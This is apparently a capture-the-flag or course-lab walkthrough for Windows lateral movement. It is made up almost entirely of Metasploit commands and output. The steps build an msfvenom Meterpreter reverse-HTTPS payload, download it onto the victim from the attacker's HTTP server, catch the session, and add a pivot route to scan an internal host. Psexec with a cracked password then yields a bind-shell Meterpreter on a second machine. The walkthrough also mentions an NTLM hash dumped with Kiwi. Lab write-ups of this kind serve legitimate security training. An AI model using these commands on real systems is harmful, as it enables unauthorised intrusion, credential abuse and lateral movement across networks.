Questions
Follow steps from this section and find the flag on VM #2 (ITWK02) on the desktop of user luiza.

nc 192.168.195.223 4444
C:\Users\luiza>ipconfig
...
   IPv4 Address. . . . . . . . . . . : 192.168.195.223
   IPv4 Address. . . . . . . . . . . : 172.16.150.199
...

# Create payload using msfvenom
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe

# start the http server for payload transferring
python3 -m http.server 80

# Upload the payload 
PS C:\Users\luiza> iwr -uri http://192.168.45.214/met.exe -Outfile met.exe

# Access to msfconsole
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
set LHOST tun0
run -j

msf6 exploit(multi/handler) > sessions -i 1
# Set to bg and add new route
msf6 exploit(multi/handler) > route add 172.16.150.0/24 1
[*] Route added
msf6 exploit(multi/handler) > route print
   172.16.150.0       255.255.255.0      Session 1
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.150.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run
...
[+] 172.16.150.200:       - 172.16.150.200:445 - TCP OPEN
[+] 172.16.150.200:       - 172.16.150.200:3389 - TCP OPEN
...

#  We'll attempt to use the psexec1 module to get access on the second target as user luiza. In the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully crack the NTLM hash and the clear-text password is BoccieDearAeroMeow1!. For psexec to succeed, luiza has to be a local administrator on the second machine. For this example, let's also assume that we confirmed this through information gathering techniques.

# Let's use exploit/windows/smb/psexec and set SMBUser to luiza, SMBPass to BoccieDearAeroMeow1!, and RHOSTS to 172.16.5.200.

NOTE: Added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as windows/x64/meterpreter/bind_tcp, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.

msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.150.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
msf6 exploit(windows/smb/psexec) > run
meterpreter > 
# shows that we successfully used the psexec exploit module to obtain a Meterpreter shell on the second target via the compromised machine.


